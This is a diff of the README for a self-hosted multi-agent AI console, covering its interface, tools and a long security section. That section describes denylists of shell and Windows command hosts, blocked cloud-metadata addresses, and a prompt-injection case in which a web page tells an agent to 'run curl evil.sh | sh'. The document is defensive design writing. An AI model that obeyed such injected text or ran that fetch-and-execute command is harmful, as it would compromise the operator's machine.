@@ -6,7 +6,7 @@
   BryceFromIndiana@gmail.com
 -->
 [![Architecture diagram](https://gitdiagram.com/diagram-badge.svg)](https://gitdiagram.com/mbhudson/autonomous?utm_source=readme&utm_medium=badge)
-# 🧠 Autonomous Loop Studio 
+# 🧠 Autonomous Loop Studio
 
 > ## A self-hosted, universal multi-agent AI console. Point it at **any** model, hand the agents **real tools**, and watch the loop run.
 
@@ -20,39 +20,39 @@
 ![Android](https://img.shields.io/badge/Android-coming_soon_to_Play_Store-3DDC84?logo=android&logoColor=white)
 [![Ask DeepWiki](https://img.shields.io/badge/Ask-DeepWiki-6E56CF?logo=readthedocs&logoColor=white)](https://deepwiki.com/MBHudson/Autonomous)
 
+![Glass Desktop Theme — the glass shell: edge rail, Config drawers, a wide chat and the live network map](screenshots/new-ui-main.png)
 
-![Desktop 2026 — the glass shell: edge rail, Config drawers, a wide chat and the live network map](screenshots/new-ui-main.png)
+**☝️ NEW: Glass Themed Desktop** — the new face of the studio: 💎 floating glass cards on an edge rail, 🗂️ Config that flies out of its own label, 💬 a chat you can drag wider or throw to the full screen, 🕸️ the map front and center with its button group lifted into the header, and 🪶 panels that tuck away while you read a node. Pick it in Config → Interface — no reload, and nothing you had set is lost.
+<br>
 
-**☝️ That's Desktop 2026** — the new face of the studio: 💎 floating glass cards on an edge rail, 🗂️ Config that flies out of its own label, 💬 a chat you can drag wider or throw to the full screen, 🕸️ the map front and centre with its button group lifted into the header, and 🪶 panels that tuck away while you read a node. Pick it in **Config → Interface** — no reload, and nothing you had set is lost.
+<h6> NOTE: The Glass Theme is pretty GPU-resource-heavy, with all its shaders and animation. ☹️ See Config → Desktop and/or Config → Resource Manager for scaling options. OR... </h6>
 
-**🗂️ Classic is the default** — and it is the picture right below. Setup panel, chat and map/network panel side by side, nothing behind a rail, everything where it has always been.
 
-![Classic — the default interface: setup panel, chat and network map side by side](screenshots/mainscreen01.png)
 
-**Both are the same app.** Same components, same store, same tools: Classic is **not** a legacy mode, and neither shell is missing a feature — Classic is simply the calmer, flatter way to see all of it at once. Narrow the window under 1025px and **either** one becomes the same slide-over drawer layout, so the phone experience is identical whichever you choose. 🔁
+**🗂️ Classic is the DEFAULT** — perfect for all systems and devices! — and it is the picture right below. Setup panel, chat and map/network panel side by side, nothing behind a rail, everything where it has always been.
 
-**Autonomous Loop Studio** (the "Router") is a single-folder PHP app — 🚫 no database, 🚫 no build step, 🚫 no external service. It runs on plain PHP (or Apache via XAMPP), keeps everything in JSON files, and drops a whole team of AI agents into your browser with a filesystem, a shell, the web, memory, a visual routing chart — and **MCP in both directions**.
+![Classic — the DEFAULT interface: setup panel, chat and network map side by side](screenshots/mainscreen01.png)
 
 ### 🆕 What's new
 
 **Newest first.** 🚀 Each entry names what shipped in that release; everything older has been folded into the ✨ **What's inside** feature list and the 🔐 **Security** section, where it stays as reference. The most recent release sits at the top.
 
-### 🆕 v410 — the Proxy tab says what it skips 💡
+### 🆕 v411 — the README, audited 📖
 
-*A proxy is for leaving the network, so a runner on the LAN never goes through one. The tab listed the selection and nothing else, which read as "everything is proxied" while the local call went direct.*
+*The whole document was read against the code. It was not only typos: one section described the proxy as it worked before v408, the test figures came from a suite half this size, and Quick start had drifted 1,300 lines down the page.*
 
 | | |
 |---|---|
-| 💡 **The bypass is visible** | With a proxy selected, the tab names the host it is not used for |
-| 🖥️ **What counts as local** | Loopback, 10.x, 172.16–31.x, 192.168.x, CGNAT, link-local, `.local`/`.lan` names and bare hostnames |
-| ☁️ **Cloud is still proxied** | A public endpoint is never labelled local, so a working proxy is not hidden |
-| ✅ **Guarded** | `localEndpoints.test.mjs` pins the rule the server applies |
-
+| 🚀 **Quick start, back near the top** | above the Security section, so the first screen has a way in |
+| 🔐 **Security stays high** | one section down, where reviewers reach it before the feature tour |
+| 🌐 **The Proxy section is true again** | LAN endpoints bypass it, clearing writes both sides, and the tab names what it skips (v408–v410) |
+| 🧪 **Numbers re-measured** | 20 PHP files · 1,129 assertions, 24 JS files · 681 assertions, ~38s fresh-copy |
+| ✍️ **Typos and stale paths** | its / veiled / actions, `web.config`, Resource Manager, the architecture tree |
 ---
 
 ## 🧭 Contents
 
-Jump straight to a section — every heading on this page is also clickable.
+Jump straight to a section — every heading on this page is linkable; these are the ones worth a jump.
 
 **🚀 Start here**
 
@@ -64,9 +64,17 @@ Jump straight to a section — every heading on this page is also clickable.
 
 **🧠 Using the studio**
 
-- [🧠 Brain Lab](#-brain-lab)
-- [🧪 API Lab](#-api-lab)
 - [🔀 Routing chart](#-routing-chart)
+- [🧠💉😉 Brain Lab](#-brain-lab)
+- [🧪 API Lab](#-api-lab)
+- [🌐 Built-in browser](#-built-in-browser--you-watch-the-agents-drive)
+
+**🔐 Security & guardrails**
+
+[🔐 overview](#-security--guardrails--safe-by-construction-️) · [🔑 token](#-1-the-front-door-is-locked--a-per-device-access-token) · [🚦 approvals](#-2-approvals--nothing-scary-happens-without-a-nod) · [🧾 allow/deny](#-3-allow--deny-lists--an-argv-level-bouncer) · [🧱 the jail](#-4-the-jail--a-fence-with-no-back-gate) · [🐚 no shell](#-5-no-shell-to-hijack) · [🧬 atomic edits](#-6-edits-are-atomic-or-they-dont-happen) · [🐙 git](#-7-git-runs-on-a-leash) · [🌐 SSRF](#-8-network-egress-is-fenced-ssrf-guardrails) · [🕵️ secrets](#️-9-secrets-never-appear-on-screen) · [🖼️ vision](#️-10-vision-is-safe-by-construction) · [🌐 browser gate](#-11-the-built-in-browser-is-gated-on-every-hop) · [🤝 MCP server](#-12-mcp-server--lending-tools-without-giving-away-the-house) · [🧷 injection](#-13-prompt-injection-posture) · [🚫 defaults](#-14-everything-dangerous-defaults-to-off-) · [🧯 fails closed](#-15-fails-closed-and-tells-the-truth) · [🗄️ storage](#️-16-storage-is-never-web-served--in-every-serving-mode) · [🧪 guard tests](#-17-the-guards-are-proven-not-assumed) · [🌐 no CORS](#-18-closed-by-default-in-the-browser-too) · [🖥️ programs](#️-19-opening-programs--a-name-never-a-command-line) · [🔐 masked reads](#-20-secrets--masked-going-out-restored-coming-back) · [🏠 local-only](#-21-no-token-set--this-machine-only) · [🧾 trace integrity](#-22-the-trace-is-written-by-this-app-alone) · [🧪 suite isolation](#-23-the-test-suite-cannot-touch-the-trace--or-another-files-server)
+
+**✨ Features**
+
 - [🖼️ Images & vision](#️-images--vision)
 - [🎙️ Voice & audio](#️-voice--audio)
 - [⌨️ Slash commands](#️-slash-commands)
@@ -88,15 +96,11 @@ Jump straight to a section — every heading on this page is also clickable.
 - [💾 Export & import](#-export--import)
 - [🔁 Updates — check, download, verify, install](#-updates--check-download-verify-install)
 
-**🔐 Security & guardrails**
-
-[🔐 overview](#-security--guardrails--safe-by-construction-️) · [🔑 token](#-1-the-front-door-is-locked--a-per-device-access-token) · [🚦 approvals](#-2-approvals--nothing-scary-happens-without-a-nod) · [🧾 allow/deny](#-3-allow--deny-lists--an-argv-level-bouncer) · [🧱 the jail](#-4-the-jail--a-fence-with-no-back-gate) · [🐚 no shell](#-5-no-shell-to-hijack) · [🧬 atomic edits](#-6-edits-are-atomic-or-they-dont-happen) · [🐙 git](#-7-git-runs-on-a-leash) · [🌐 SSRF](#-8-network-egress-is-fenced-ssrf-guardrails) · [🕵️ secrets](#️-9-secrets-never-appear-on-screen) · [🖼️ vision](#️-10-vision-is-safe-by-construction) · [🌐 browser gate](#-11-the-built-in-browser-is-gated-on-every-hop) · [🤝 MCP server](#-12-mcp-server--lending-tools-without-giving-away-the-house) · [🧷 injection](#-13-prompt-injection-posture) · [🚫 defaults](#-14-everything-dangerous-defaults-to-off-) · [🧯 fails closed](#-15-fails-closed-and-tells-the-truth) · [🗄️ storage](#️-16-storage-is-never-web-served--in-every-serving-mode) · [🧪 guard tests](#-17-the-guards-are-proven-not-assumed) · [🌐 no CORS](#-18-closed-by-default-in-the-browser-too) · [🖥️ programs](#️-19-opening-programs--a-name-never-a-command-line) · [🔐 masked reads](#-20-secrets--masked-going-out-restored-coming-back) · [🏠 local-only](#-21-no-token-set--this-machine-only) · [🧾 trace integrity](#-22-the-trace-is-written-by-this-app-alone) · [🧪 suite isolation](#-23-the-test-suite-cannot-touch-the-trace--or-another-files-server)
 
 **🔌 Integrations · 📱 Platform · 📚 Reference**
 
 - [🔌 MCP client](#-mcp--connect-out-to-other-servers-client)
 - [🖥️ MCP server](#️-mcp--let-others-connect-in-server)
-- [🌐 Built-in browser](#-built-in-browser--you-watch-the-agents-drive)
 - [📱 Android & mobile](#-android--mobile)
 - [🧩 Architecture](#-architecture)
 - [🧪 Tests](#-tests)
@@ -149,7 +153,7 @@ Jump straight to a section — every heading on this page is also clickable.
 | 🕸️ **MCP on the graph** | Outgoing calls and incoming friends drawn as live nodes with editable access |
 | 🖥️ **Two interfaces** | **Classic** (default) and **Desktop 2026** — one switch, same features, same store |
 | 🎛️ **Desktop card** | Fog · bloom · floating floor · floor pin · map detail · frame cap · glass — tuned defaults, every knob exposed |
-| 🌐 **Proxy** | Hundreds of live HTTP proxies — **elite** and **anonymous** only — with ping, uptime and favourites; one click routes every agent's outbound traffic through it |
+| 🌐 **Proxy** | Hundreds of live HTTP proxies — **elite** and **anonymous** only — with ping, uptime and favourites; one click routes outbound traffic through it — every endpoint on your own network goes direct |
 | 🔄 **Self-updates, one click** | A load-time check that names what shipped, asked again within the hour and offered on every load until installed, a verified download that shows the diff, and an installer that keeps a rollback copy first — your settings are never in scope |
 | 🖥️ **Agent-opened programs** | An agent may **name** a program on your list and it opens **detached**, so the window outlives the reply — closed gracefully, always by the binary and never by name, and audited as *started* |
 | ⌨️ **Typing into programs** | `window_type` brings an open window forward and types into it live — 2000 characters per call, special keys literal, newlines as ENTER, and a send that fails loudly if the window never came forward. It finds Windows 11's packaged Notepad, waits for a slow starter, and keeps its own Ask / Allow / Deny switch |
@@ -158,7 +162,615 @@ Jump straight to a section — every heading on this page is also clickable.
 | 📱 **Mobile-first** | Built for the phone in your pocket: the composer rides above the open keyboard, URL-bar wiggles are ignored, and an **Allow** choice finally sticks |
 
 ---
+## 🔀 Routing chart
 
+Draw the flow instead of describing it.
+
+**Nodes** — agent, parallel, merge, checkpoint, delay, loop, end.
+
+![Routing chart — three workflows with loops and fan-out](screenshots/routing-three-workfows.png)
+
+**Loops** carry per-lap state, and **parallel fan-out** runs every ready node concurrently — the scheduler handles it.
+
+![A loop feeding a parallel group](screenshots/routeing-loop.png)
+
+**Checkpoints** pause the run for review before it continues downstream.
+
+![A checkpoint waiting for review](screenshots/checkpoint.png)
+
+**Delays** wait a duration or until a wall-clock time, and hold only their own branch.
+
+**Live run state** shows on the edges (marching + glow while running, settle when done), with a faint **ghost transcript** of the chat behind the canvas and an **align-to-grid** snap (off by default). A **notification bell** lists run errors/warnings.
+
+---
+
+## 🧠 Brain Lab
+
+![Brain Lab](screenshots/Brain-Lab.png)
+
+One rail for everything about the selected agent:
+
+<details>
+<summary>The full rail, locks, and the Config tidy-up</summary>
+
+- **Identity** — name, label, role, provider, model, colour, active.
+- **Prompts & Profiles** — the agent's system prompt, an always-append box, and reusable **direction profiles** you can attach and lock. (A fleet-wide override lives in the Agents-tab header — see *Global pre-prompt override*.)
+- **Direction profiles** — reusable, lockable instructions you can **attach** and **append** to any agent, so a house style is defined once and shared.
+- **Rate / Throttle** — per-agent pacing.
+- **Approvals & Tools** — per-tool **allow / ask / deny**, plus a tool protocol picker that shows the **auto-detected** dialect.
+- **Custom tools** — define your own, straight from the rail.
+- **Sandbox** — a per-agent **file jail** and the file manager.
+- **Memory** — private and collective notes, a Long-term-memory switch, and delete buttons (forgetting is a first-class action).
+- **Always-On** — a standing goal, loop cadence, and a live RUNNING/HELD/IDLE badge. (Full walk-through in *Always-On — the loop that runs itself* below.)
+
+Every setting has a 🔒 **lock**: unlocked agents follow the global value live; a lock pins the agent to its own value so a global change never moves it. 🔏
+
+---
+Note: The "Memory", "Prompts and Profiles", "Agent Files", "Approvals and Tools" sections — thinly veiled security research tools. 🧠💉😉
+
+---
+**!!!DISCLAIMER!!! - For educational and research purposes only! - I take no responsibility for your actions. I don't even plan on taking responsibility for my own actions.**
+
+---
+
+</details>
+
+---
+## 🧪 API Lab
+
+![API Lab](screenshots/API-Lab.png)
+
+Opened from the 🧪 icon in the Agents-tab header.
+
+<details>
+<summary>Both directions, server-side sending and guardrails</summary>
+
+- **Both directions**: `curl → request → 10 languages`, and `language → request → curl/bash/Python/TypeScript/OpenAI-SDK`.
+- **Sending is server-side**, because the browser can't reach most providers (no CORS headers). The server runs the request and returns the status + body.
+- **Guardrails**: http/https only; cloud-metadata addresses refused; key-shaped headers masked on screen (copy/send still use the real value); response bodies truncated.
+
+</details>
+
+---
+
+## 🌐 Built-in browser — you watch, the agents drive
+
+![The built-in browser: live page, address bar, click-through and the drive-it rail](screenshots/Browser.png)
+
+A **real Chrome or Edge**, right inside the console — 🚫 no packages, 🚫 no extensions, just the DevTools Protocol. 🖥️ Open it from the **Browser** item in the apps notch and you get the live page, an address bar, **Go / Reload**, a **Live** auto-refresh, a headless ⇄ window toggle, and a **click-through** view: tap the page and it clicks. ✨
+
+<details>
+<summary>Click, type and read, logins, gates and the block list</summary>
+
+- 🖱️ **Click, type, read** — click anywhere on the screenshot, type into the field you need, press **Enter**, and pull the page's visible text.
+- 🤖 **Agents use the same page** — `browser_open` / `browser_click` / `browser_type` / `browser_read` / `browser_wait` drive it too, so a model can genuinely operate a web app.
+- 🔐 **Logins stick** — the profile is persistent: log in **once** (headless, or in a window you can take over 🫳) and both you and the agents reuse the session.
+- 🛡️ **Off by default and gated** — Config → Labs → *Browser* switches it on; **http/https only**, cloud-metadata addresses refused, and every route is token-gated.
+- 🚫 **A domain / URL / IP block list** — a right-rail box on the Browser screen. One pattern per line, `*` wildcard: `*.gov`, `*word*`, a bare host/IP (`10.0.0.1`), or a URL path (`site.com/a/b/`). Enforced **server-side on every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
+- 🐕 **One browser, reaped** — launching (or stopping) reaps any stray headless Chrome/Edge still holding the profile dir, so orphan instances never pile up and chew CPU/GPU.
+- ⚡ **No multi-second stalls** — DevTools HTTP is read by exact `Content-Length` over a raw socket, navigation returns the moment the page is interactive, and every action is single-flight so a slow page can't stampede the connection pool.
+
+</details>
+
+---
+
+## 🚀 Quick start
+
+### 🪟 Windows — one click
+- **`start.bat`** — the one-click launcher. First run installs XAMPP (Apache + PHP only, no MySQL), links this folder into `htdocs\router`, configures Apache, creates the access token, starts it and opens the app. Later runs just start Apache. Use this when several agents run at once: Apache is multi-threaded.
+- **`start-php.bat`** — legacy built-in server (single-threaded). Fine for one agent at a time, or on machines where Apache cannot run.
+- **`setup-xampp.bat`** — repair / advanced installer, used by `start.bat` automatically. Run it directly to reinstall XAMPP or pick another port (`setup-xampp.bat -Port 8090`).
+
+ 🧵**Autonomous' implementation of Apache / PHP is not single-threaded — and that is exactly the point.**
+ Apache serves many requests at once (a pool of worker processes and threads), so a
+ whole team of agents really does run in parallel. 
+ **Autonomous ships the workaround:** one click installs XAMPP
+ (Apache + PHP only), points it at a free port, loads the `mod_*` modules the
+ app's `.htaccess` needs, links the folder and starts a genuinely concurrent
+ server — **zero configuration, no database, nothing to hand-tune**. That is the
+ mold this project breaks: a multithreaded local server, deployed in one click.
+ (`start-php.bat` remains for the rare machine where Apache cannot run; it is the
+ slow single-threaded fallback.)
+> *PHP's own built-in server is the opposite: `php -S` is a single process,
+> so one streamed model reply holds the only slot for its entire duration while
+> every other agent — and the browser's own state polling — queues behind it until
+> the fetch dies with `NetworkError`. Windows PHP cannot fork, and the usual
+> local Windows PHP setups
+> either accept that limit or expect you to install and hand-edit Apache/FPM
+> yourself. *
+
+### 🐧 Linux / macOS
+```bash
+./start.sh          # or ./start.sh 8090 for another port
+```
+
+### 🌍 Deploying on a real web host (Apache / nginx / IIS)
+
+The one-folder design means `storage/` (the token, provider keys, every session
+and the exec allow/deny lists) lives **inside the app folder**. That folder must
+**never** be reachable over HTTP. Everything here is about keeping it that way. 🔒
+
+The same rules also cover `tests/`: dev tooling that never runs at runtime, but
+that nobody else needs to read either. The full grid — every path against every
+serving mode, dotfiles and case variants included — is in
+**Security & guardrails → §16**, and the rules are **tested by making the real
+request** (§17). 🧪
+
+- 🟡 **Apache** — `storage/.htaccess` and `tests/.htaccess` ship with the app and
+  deny their whole folder (`Require all denied`, with a 2.2 fallback).
+  `./setup-token.sh` **re-creates the storage one if a deploy lost it**. Just make
+  sure `AllowOverride` lets `.htaccess` apply (the XAMPP installer sets this for
+  you). The app root `.htaccess` also refuses `storage`, `logs`, `tmp`, `sessions`
+  and `tests` as a path segment **at any depth** — a backup or archived copy of the
+  app kept inside the web root brings its own `storage/` and `tests/`, and a copy
+  made before `tests/.htaccess` existed would otherwise serve its test files in
+  full. That guard is `RedirectMatch 403` (mod_alias), not a `RewriteRule`: a child
+  `.htaccess` replaces its parent's per-directory rewrites, so a rewrite never sees
+  the nested path, while mod_alias config merges normally.
+- 🔴 **nginx** — **ignores `.htaccess` entirely**, so you *must* add the rules
+  yourself. Ship the included **`nginx.example.conf`** into your `server{}` block
+  (it denies `storage`, `logs`, `tmp`, `sessions` and `tests` as a path segment **at
+  any depth** — so a backup or an archived copy of the app kept inside the web root
+  cannot expose its own `config.json` — plus dotfiles and loose
+  `.json/.log/.ini/.bak/.key/.pem` files), then `nginx -t && systemctl reload nginx`.
+  A file whose *name* merely contains one of those words (`ui/js/storage.js`, `ui/js/tests.js`)
+  is still served.
+- 🔵 **IIS** — add a `web.config` at the app root that blocks the `storage` and
+  `tests` segments, e.g.:
+  ```xml
+  <configuration><system.webServer><security><requestFiltering>
+    <hiddenSegments>
+      <add segment="storage" /><add segment="logs" /><add segment="tmp" />
+      <add segment="sessions" /><add segment="tests" />
+    </hiddenSegments>
+  </requestFiltering></security></system.webServer></configuration>
+  ```
+- 🧪 **The PHP built-in server** (`start-php.bat` / `php serve.php`) already
+  refuses `/storage`, `/logs`, `/tmp`, `/sessions`, `/tests` and dotfiles with a
+  `403` — no config needed.
+- ✅ **Verify it, don't assume it.** After any deploy, fetch
+  `https://your-host/router/storage/config.json` **and**
+  `https://your-host/router/tests/js/run.mjs` in a private window. You must get
+  **403 / 404** for both — never JSON or source. If you do, stop and fix the rule
+  above before doing anything else. 🚨
+
+### 🔑 First run
+The launchers install PHP + the extensions it needs (curl, openssl, mbstring, fileinfo, zip) without touching your own `php.ini`, bundle CA certs so HTTPS verifies, and print an **access token** once. Paste it into **Config → Access token** in the app — it saves on paste (there's no SAVE for that field, on purpose).
+
+On Windows the app opens at `http://localhost:8080/router/` (Apache); on Linux/macOS it opens at `http://127.0.0.1:8080/`. If you miss the token, run `start.bat -Token` to print it again. Nothing ships with keys — add your own providers in the **Providers** tab.
+
+---
+
+## 🔐 Security & guardrails — safe by construction 🛡️
+
+> **The short version:** giving a language model a shell, a filesystem and the web
+> is normally a terrifying idea. So this app assumes the model is *hostile*, the
+> web content it reads is *booby-trapped*, and the only trustworthy actor is
+> **you, the operator**. Every capability is **off until you switch it on**, every
+> dangerous action **asks first**, and every escape hatch has a floor beneath it.
+> Nothing ships with a key 🔑, nothing runs before a token 🔑, and no tool can
+> reach past the fence you drew. 🧱
+
+### 🔑 1. The front door is locked — a per-device access token
+- **🚪 Every single API route is gated.** With a token set, a request without it gets `401`; a copy with `require_token` on but no token at all answers `503 {"error":"no token configured"}`; and with `require_token` off, a caller that is not on this machine gets `403 local requests only` (§21). The only thing standing between a stranger and your agents' conversations, your files and your shell; the app has **no user accounts**, on purpose.
+- **🧬 Nothing ships with a token.** A fresh copy **refuses to serve anything** until you run `./setup-token.sh` (or the one-click installer does it for you) — the `503` above is what anyone gets until then. You literally cannot forget to set one.
+- **📵 The token never roams.** It is a **device-local credential**, *stripped from every state bundle* before it is mirrored to the server or synced to another device. One browser's empty field can never wipe another device's working paste.
+- **🔁 Rotate on demand** — `./setup-token.sh --force` mints a new one; the old value dies instantly.
+- **🧷 A restore cannot hand the gate away.** RESTORE keeps **this copy's own** access token, gate and roots even when the file came from an installation with a different token — so restoring someone else's backup can neither lock you out of your copy nor open it with theirs.
+- **🔎 Lost it? `./setup-token.sh --show` prints the one in use** and says whether the gate is on or off. It
+  needs python **or** php — whichever answers, php being the one a running copy cannot be without — and on
+  Windows `start.bat -Token` prints the same token with no interpreter at all.
+
+### 🚦 2. Approvals — nothing scary happens without a nod
+- **✋ Ask-first by default.** `write_file`, `exec`, `run_code`, `git_commit` and their friends **queue a prompt** you answer: **Allow once / Always / Deny**.
+- **🟢 Auto-approve is opt-in** — an explicit switch you flip, never an inherited default. Turn it on and any agent may write files without asking; leave it off and a human stays in the loop.
+- **🛑 Auto-deny — the panic button.** One switch refuses *everything* that would otherwise ask, instantly, everywhere.
+- **📥 A single Pending-approvals queue** collects everything waiting (from every agent **and** every remote MCP friend) so nothing slips through unseen.
+
+### 🧾 3. Allow / Deny lists — an argv-level bouncer
+
+![The Allow / Deny panel: per-interpreter levels, the editable denylist, and Restore built-in defaults](screenshots/deny-interpreters-fixed.png)
+- **✅ An allowlist you own** decides which programs may run at all. Each command is matched **argument by argument** — no glob fuzz.
+- **⛔ A denylist that wins over approvals.** It is checked *before* the allowlist and before the approval prompt, so a name on it can never be waved through with "Always allow". `reboot`, `shutdown`, `rm`, `sudo`, `cmd`, `powershell` and the classic foot-guns live here.
+- **🔁 …but nothing is denied *forever*.** The list is a **default**, not a law: an explicit `sandbox.exec_deny` in `storage/config.json` **replaces it wholesale**, and the same list is editable inline under **Config → Shell access** (or an MCP card's *Permissions* tab). Remove a name and it becomes an ordinary command again — refused as *"not allowed"* and back in the approval queue, exactly like everything else. No program is refused by name anywhere in code.
+- **↩️ The undo path is on screen, not in the docs.** A refusal names the exact place to fix it — *"delete the `explorer` line under **Config → Permissions → Shell access → Allow / Deny** (section 4), add it to section 2"* — and says why an approval can't do it (the denylist is checked first). In that panel, **Restore built-in defaults** reloads the shipped list even after a custom one replaced it, so you can always see what you replaced. An empty box falls back to the built-in defaults on purpose: clearing it must not silently un-deny `rm` and `sudo`. For a genuinely empty denylist, set `"exec_deny": []` in `storage/config.json` — which is what the panel's hint tells you.
+- **🧨 Tripwires for metacharacters** — `|`, `&&`, `eval`, `xargs`, `env` and friends are refused, so a model can't smuggle a second command through a "harmless" one.
+- **🎚️ Per-interpreter levels** — Blocked / Scripts only / Full — so `run_code` can be dialled from "no" to "quiet scripts" to "go wild" independently of `exec`.
+- **🚀 Background commands pass the same bouncer.** `exec_start` goes through the allowlist, the denylist and the approval prompt exactly as `exec` does — a server or watcher is not a way around the gate — and `exec_kill` stops the handle it was given. Inline-code flags stay refused for known interpreters even when merely allowlisted, and the path guard covers unlisted commands too.
+
+### 🧱 4. The jail — a fence with no back gate
+- **🔒 Every path is resolved server-side.** `../`, `..\\`, absolute paths and **symlinks** are all resolved and then checked — anything outside your declared **read/write roots** is refused with a message the model can read, not a mysterious crash.
+- **🙈 Protected paths — secrets are invisible even *inside* a root.** A default deny-list (`storage/`, `.git`, `.env*`, `*.pem`, `*.key`, dotfiles, …) is enforced in the resolver itself, so **even if you point the root at the whole app folder, the access token and every provider key still cannot be read.** Clear the list to opt out — nothing is permanent.
+- **✂️ Write scope is separate from read scope.** Keep writes in a scratch folder and even a prompt-injected agent can't overwrite `Config.php`, `.htaccess` or session data.
+
+### 🐚 5. No shell to hijack
+- **🧩 `exec` takes an *argv array*, not a string.** There is **no `sh -c`, no pipes, no redirects, no `$(...)`** — so there is no second command to inject, ever. The dangerous parts of "running a command" simply don't exist here.
+- **🪟/🐧 Windows-aware** — builtins are implemented in PHP where no `.exe` exists, `.cmd`/`.bat` shims are never shelled, and the prompt is told the truth about the host so it stops guessing.
+- **🔤 One entry covers both spellings.** Policy comparisons fold case and ignore a trailing `.exe`/`.com`, so `exec_allow: [grep]` matches the `grep.exe` Git for Windows actually ships, and a deny entry for `bash` also stops `bash.exe` (the WSL launcher). Without this the lists only protected the spelling you happened to type.
+- **🪟 The Windows command hosts are denied by default.** `cmd`, `powershell`, `pwsh`, `wscript`, `cscript`, `mshta`, `rundll32`, `regsvr32`, `msiexec`, `wmic`, `schtasks`, `sc`, `reg`, `regedit` and `explorer` are each the local spelling of `sh -c` — the payload rides inside an argument, so the allowlist, the path guard and the jail never see it. They are **defaults you can remove**, not permanent refusals: that is the difference between a policy and a hardcoded block.
+
+### 🧬 6. Edits are atomic, or they don't happen
+- **🧷 `apply_patch` (V4A) and `multi_edit` are all-or-nothing.** Every hunk must match its context **exactly once**; one miss and **nothing is written** — no half-applied file, no corrupted source.
+- **👀 Read-before-write** is the taught workflow, and search/replace refuses an ambiguous match rather than guessing which one you meant.
+
+### 🐙 7. Git runs on a leash
+- **📜 A subcommand allowlist** — read-only commands (`status`, `diff`, `log`, `show`, `blame`) run freely; anything that **writes** (`add`, `commit`, `checkout`, …) **asks first**.
+- **🚫 Retargeting flags refused** — `-c`, `--git-dir`, `--work-tree`, `--output` can't be used to point git at somewhere it shouldn't go. `git_commit` supplies a safe default identity so it works on a clean host.
+
+### 🌐 8. Network egress is fenced (SSRF guardrails)
+- **🛰️ `fetch_url` and `http_request` refuse private and cloud-metadata hosts** by name — `169.254.x.x`, `metadata.google.internal`, `100.100.100.200` and friends — so a model can't use your box to probe the internal network or steal cloud credentials.
+- **🔒 `http/https` only.** Spoofed `Host`, `Content-Length` and `Accept-Encoding` headers are **stripped**; responses are **truncated** so a giant page can't exhaust memory.
+- **🧪 The API Lab keeps the same rules** and names the layer it failed at (dns / tls / connect / timeout / blocked) instead of leaking a stack trace.
+- **🔒 The certificate is checked, not assumed.** Every outbound model and speech call used to carry `CURLOPT_SSL_VERIFYPEER => false`, so any host that answered was trusted with the API key and the prompt — a café network, a shared VPS neighbour or a proxy from a free list could stand in for the provider. Verification is on now: **Auto** (default) verifies real providers and exempts loopback, private ranges, `.local`/`.lan`/`.internal` names and single-word host names so a self-signed local runner still works; **Always verify** covers those too; **Never verify** is an explicit choice saved in `storage/config.json` under `tls.verify`, and the panel spells out what it means. Plain `http://` endpoints are untouched — there is no certificate in that exchange to check.
+- **📌 A pin is a fingerprint, not a checkbox.** Trusting a LAN host means reading the chain it presents, seeing the SHA-256, and confirming it: `storage/tls/trusted.pem`, listed in Config → TLS / Certificates with its expiry, removable with FORGET (the last removal deletes the file, because an empty CAINFO fails every call while a missing one simply means nothing is pinned). `tls.ca_bundle` can still point at a PEM you manage yourself; an explicit bundle wins over pins and the panel says when it does. Nothing is ever written outside `storage/tls/`, and a certificate close to expiry is named in the TLS panel and in the bell before it becomes an outage.
+
+### 🕵️ 9. Secrets never appear on screen
+- **🙈 Key-shaped headers (`Authorization`, `x-api-key`, `Cookie`, …) are masked in the UI** — display only. Copy and send still use the real value, and the server **never echoes request headers back**.
+- **📚 The converter lesson, learned the hard way.** Saved browser pages faithfully preserve secrets. The app now keeps such dumps **out of the webroot**, and the guidance is plain: **strip keys before saving a page.**
+
+### 🖼️ 10. Vision is safe by construction
+- **🧨 An image that is *also* a script** is the classic polyglot attack. Only **PNG / JPEG / WebP / GIF** are accepted, and only after they sniff as **inert**.
+- **☁️ The bytes never touch the server.** An attached image becomes an in-memory `data:` URL and rides in the request's `image_url` field — **no upload endpoint, no file on disk.** 🗑️
+
+### 🌐 11. The built-in browser is gated on every hop
+- **🚪 Off by default**; every browser route returns **403** until you enable it (and the API refuses the tools regardless of what a prompt says).
+- **🔗 `http/https` only**, cloud-metadata refused, and a **server-side block list** (`*.gov`, `*word*`, bare hosts/IPs, URL paths) is enforced on **every navigation** — yours *and* the agents' — and **re-checked after a click or type** in case a link reaches a banned host.
+- **🐕 One instance, reaped.** Launching reaps any stray headless Chrome/Edge still holding the profile dir, so there is never a pile of them chewing CPU/GPU.
+
+### 🤝 12. MCP server — lending tools without giving away the house
+- **🎫 Per-friend tokens, each with a scope** — **read** / **write** / **exec** — plus an optional **IP allowlist** and **one-click revoke**. Tokens never expire until you kill them.
+- **📏 Scope is a *ceiling*, the Sandbox is the *floor*.** A friend's token only decides *which* tool it may reach; the call still runs through **every** control above — the file jail, allow/deny lists, interpreter levels, code gate and the approval queue.
+- **⏳ An un-allowed command lands in *your* Pending-approvals list** and the friend's call simply returns *"waiting for the operator."*
+- **🏚️ Friends work in a scratch folder** that gets a **deny-all `.htaccess`**, so what they write is never served over the web.
+- **🧾 Every call is audited** to `storage/mcp.log` (now JSON, so the graph can replay it).
+
+### 🧷 13. Prompt-injection posture
+- **Abandon all trust, ye who `fetch` here.** Anything an agent *reads* is treated as hostile input — which is exactly why commands are allowlisted, executed without a shell, and every path is jailed. A web page that says *"run `curl evil.sh | sh`"* hits three walls before it does anything: the allowlist, the no-shell exec, and the deny list.
+- **🛠️ Tool calls win the argument.** The tool instructions state plainly that a tool call is the **one exception** to any "reply with only text / N words" rule, and the loop **re-prompts once** if a model merely *narrates* a tool call instead of sending it.
+- **🚧 Agents can *call* MCP servers — never add one.** Server connections are operator-only.
+
+### 🚫 14. Everything dangerous defaults to OFF 🐢
+| Capability | Default | Guardrail |
+| --- | --- | --- |
+| 🔑 Access token | **required** | `401` without it — nothing runs first-run |
+| 🐚 `exec` (shell) | **off** | allowlist + absolute deny + no shell |
+| 🐍 `run_code` | **off** | per-interpreter level (Blocked / Scripts / Full) |
+| 🌐 Built-in browser | **off** | `403`, http/https only, block list, SSRF guard |
+| 🔁 API pool | **on** | only engages for a provider that *has* pool keys — with none, `pickKey` returns null and the single provider key is used exactly as before |
+| 🖥️ MCP server | **off** | per-friend scoped tokens, audit log |
+| 🟢 Auto-approve | **off** | every write still asks |
+| 🕶️ Run while tab hidden | **off** | a background loop can't bill you silently |
